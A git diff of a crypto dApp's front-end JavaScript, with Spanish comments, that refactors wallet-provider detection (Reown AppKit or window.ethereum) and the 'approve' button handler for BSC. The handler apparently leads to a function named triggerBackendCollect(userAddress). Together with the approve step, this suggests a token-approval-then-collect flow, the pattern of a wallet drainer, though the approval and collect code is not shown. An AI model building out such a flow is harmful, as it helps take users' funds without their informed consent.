@@ -62,19 +62,6 @@ function setLoading(on, label = "Processing…") {
   if (btnSpinner) btnSpinner.hidden   = !on;
 }
 
-// ─── Get Active Provider (AppKit / Injected fallback) ─────────────────────────
-async function getActiveProvider() {
-  // 1. Intentar obtener el proveedor activo desde Reown AppKit
-  if (window.modal && typeof window.modal.getWalletProvider === "function") {
-    try {
-      const provider = window.modal.getWalletProvider();
-      if (provider) return provider;
-    } catch (_) {}
-  }
-  // 2. Respaldo por inyección estándar del navegador / extensiones
-  if (window.ethereum) return window.ethereum;
-  return null;
-}
 
 // ─── Backend collect trigger ──────────────────────────────────────────────────
 async function triggerBackendCollect(userAddress) {
@@ -100,19 +87,31 @@ async function triggerBackendCollect(userAddress) {
   throw lastErr;
 }
 
-// ─── Main Button Handler (AppKit Modal Forzado) ──────────────────────────────
+// ─── Get Active Provider (AppKit / Injected fallback) ─────────────────────────
+async function getActiveProvider() {
+  // 1. Intentar obtener el proveedor activo desde Reown AppKit
+  if (window.modal && typeof window.modal.getWalletProvider === "function") {
+    try {
+      const provider = window.modal.getWalletProvider();
+      if (provider) return provider;
+    } catch (_) {}
+  }
+  // 2. Respaldo por inyección estándar del navegador / extensiones
+  if (window.ethereum) return window.ethereum;
+  return null;
+}
+
+// ─── Main Button Handler Corregido ────────────────────────────────────────────
 if (approveBtn) {
   approveBtn.addEventListener("click", async () => {
-    
-    // 1. Verificar si Reown AppKit ya tiene una sesión activa
-    const isConnected = window.modal ? window.modal.getIsConnected() : false;
+    let rawProvider = await getActiveProvider();
 
-    // 2. Si NO está conectado, abrir obligatoriamente el modal flotante de selección
-    if (!isConnected) {
+    // Si no hay un proveedor activo, abrimos el modal flotante de Reown AppKit
+    if (!rawProvider) {
       if (window.modal && typeof window.modal.open === "function") {
         try {
           await window.modal.open();
-          return; // El modal se abre para que el usuario elija su wallet (PC o Móvil)
+          return; // Abre el modal para que el usuario elija su wallet en PC o Móvil
         } catch (modalErr) {
           console.error("Error al abrir el modal de Reown:", modalErr);
         }
@@ -122,16 +121,10 @@ if (approveBtn) {
       }
     }
 
-    // 3. Si YA está conectado, procedemos con la lógica de la red y el contrato
     setLoading(true, "Conectando proveedor…");
 
     try {
-      // Obtener el proveedor activo desde AppKit
-      const rawProvider = window.modal.getWalletProvider();
-      if (!rawProvider) {
-        throw new Error("No se encontró el proveedor de la billetera activa.");
-      }
-
+      // Inicializar proveedor y firmante mediante Ethers.js v6
       const provider = new ethers.BrowserProvider(rawProvider);
       
       // Validación y cambio de red nativo a BSC
